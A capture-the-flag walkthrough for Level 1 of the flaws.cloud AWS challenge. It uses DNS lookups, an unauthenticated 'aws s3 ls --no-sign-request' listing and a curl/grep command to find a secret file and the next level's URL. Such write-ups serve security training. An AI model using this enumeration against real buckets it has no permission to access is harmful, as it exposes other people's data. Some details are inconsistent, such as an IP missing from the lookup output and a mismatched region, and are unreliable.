## Level 1 - AWS Enumeration

### Level 1 Prerequisites
1. AWS CLI 
   1.  `curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"`
   2.  `unzip awscliv2.zip`
   3.  `sudo ./aws/install`

### Level 1 Table of Contents
- [Level 1 - AWS Enumeration](#level-1---aws-enumeration)
  - [Level 1 Prerequisites](#level-1-prerequisites)
  - [Level 1 Table of Contents](#level-1-table-of-contents)
  - [Level 1 Tools](#level-1-tools)
  - [Important Notes From Level 1](#important-notes-from-level-1)
  - [Commands Used in Level 1](#commands-used-in-level-1)
  - [Level 1 Steps](#level-1-steps)
    - [Level 1 Step 1 - Executing NS Lookup Against Challenge URL](#level-1-step-1---executing-ns-lookup-against-challenge-url)
      - [Level 1 Step 1 Response - Discovered IP's](#level-1-step-1-response---discovered-ips)
    - [level 1 Step 2 Execute NS Lookup Against Discovered IP/IP's](#level-1-step-2-execute-ns-lookup-against-discovered-ipips)
      - [level 1 Step 2 Response - Discovered \& Tranlsated S3 Bucket](#level-1-step-2-response---discovered--tranlsated-s3-bucket)
    - [level 1 Step 3 Access \& List S3 Bucket Files using AWS CLI - Un-Authenticated](#level-1-step-3-access--list-s3-bucket-files-using-aws-cli---un-authenticated)
    - [level 1 Step 3 Response - Discovered Secret File](#level-1-step-3-response---discovered-secret-file)
    - [level 1 Step 4 Get Level 2 URL From Secret File](#level-1-step-4-get-level-2-url-from-secret-file)
      - [level 1 Step 4 Response](#level-1-step-4-response)


### Level 1 Tools
1. [`nslookup`](https://www.nslookup.io/ "DNS Lookup Tool")
2. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
3. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
4. ['grep'](https://www.gnu.org/software/grep/ "Grep Command Line Tool")
5. 


### Important Notes From Level 1 
| :pushpin: Pin                 | Content                                                               |
|-------------------------------|:----------------------------------------------------------------------|
| :pushpin:  Bucket IP Example  | `http://flaws.cloud.s3-website-us-west-2.amazonaws.com`               |   
|-------------------------------|:----------------------------------------------------------------------|
| :pushpin:  Bucket URL         | `http://flaws.cloud.s3-website-us-west-2.amazonaws.com`               |
|-------------------------------|:----------------------------------------------------------------------|
| :pushpin:  Level Secret File  | `secret-dd02c7c.html`                                                 |
|-------------------------------|:----------------------------------------------------------------------|
| :pushpin:  Level 2 URL        | `http://flaws.cloud.s3-website-us-west-2.amazonaws.com/level2`    
|-------------------------------|:----------------------------------------------------------------------|


### Commands Used in Level 1 
| :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| :pager:  `nslookup flaws.cloud`                                                           | Execute NS Lookup Against Challenge URL                               |   
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| :pager `aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2`                | Access & List S3 Bucket Files using AWS CLI - Un-Authenticated        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| :pager:  `curl -s http://flaws.cloud/secret-dd02c7c.html | grep -oP '<a href="\K[^"]+'`   | Get Level 2 URL From Secret File                                      |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|


### Level 1 Steps

#### Level 1 Step 1 - Executing NS Lookup Against Challenge URL 
`nslookup flaws.cloud`

##### Level 1 Step 1 Response - Discovered IP's

```
Server:         192.168.220.2
Address:        192.168.220.2#53

Non-authoritative answer:
Name:   flaws.cloud
Address: 52.92.212.19
Name:   flaws.cloud
Address: 52.92.145.11
Name:   flaws.cloud
Address: 52.218.234.146
Name:   flaws.cloud
Address: 52.92.192.227
Name:   flaws.cloud
Address: 52.218.237.242
Name:   flaws.cloud
Address: 52.92.194.107
Name:   flaws.cloud
Address: 52.92.130.131
Name:   flaws.cloud
Address: 52.92.136.59
```

> **Note**
> List of Discovered IP's, 1 IP will be used for the next step

| :memo: NOTE       | `52.92.145.3`           |
|-------------------|:------------------------|



#### level 1 Step 2 Execute NS Lookup Against Discovered IP/IP's
`nslookup 52.92.145.3`

##### level 1 Step 2 Response - Discovered & Tranlsated S3 Bucket 

```
3.145.92.52.in-addr.arpa        name = s3-website-us-west-2.amazonaws.com.
Authoritative answers can be found from:
```

> **Note**
> S3 Bucket Discovered - s3-website-us-west-2.amazonaws.com

| :pushpin: PIN | `http://flaws.cloud.s3-website-us-west-2.amazonaws.com`   |
|---------------|:----------------------------------------------------------|




#### level 1 Step 3 Access & List S3 Bucket Files using AWS CLI - Un-Authenticated
`aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2`

> **Warning**
> No Sign Request & Region Flags are Required for Un-Authenticated Users

| :warning: WARNING                                 | 
|:--------------------------------------------------|
| :triangular_flag_on_post: --no-sign-request       |
|:--------------------------------------------------|
| :triangular_flag_on_post: --region us-west-1  |

#### level 1 Step 3 Response - Discovered Secret File
```
2017-03-13 23:00:38       2575 hint1.html
2017-03-02 23:05:17       1707 hint2.html
2017-03-02 23:05:11       1101 hint3.html
2020-05-22 14:16:45       3162 index.html
2018-07-10 12:47:16      15979 logo.png
2017-02-26 20:59:28         46 robots.txt
2017-02-26 20:59:30       1051 secret-dd02c7c.html

```

> **Note**
> Secret HTML File Discovered 

| :pushpin: PIN | `secret-dd02c7c.html`   |
|---------------|:------------------------|



#### level 1 Step 4 Get Level 2 URL From Secret File
> **Note**
> This can be done manually or using curl

**Using CURL Multi Line**
```
export url="http://flaws.cloud/secret-dd02c7c.html"
curl -s $url | grep -oP '<a href="\K[^"]+' 
```

**Using CURL One Line**
`curl -s http://flaws.cloud/secret-dd02c7c.html | grep -oP '<a href="\K[^"]+'`




| :memo: URL       | `curl -s $url | grep -oP '<a href="\K[^"]+`                 |
|-------------------|:-----------------------------------------------------------|

##### level 1 Step 4 Response

`http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`


| :pushpin: PIN | `http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`   |
|---------------|:---------------------------------------------------------------|






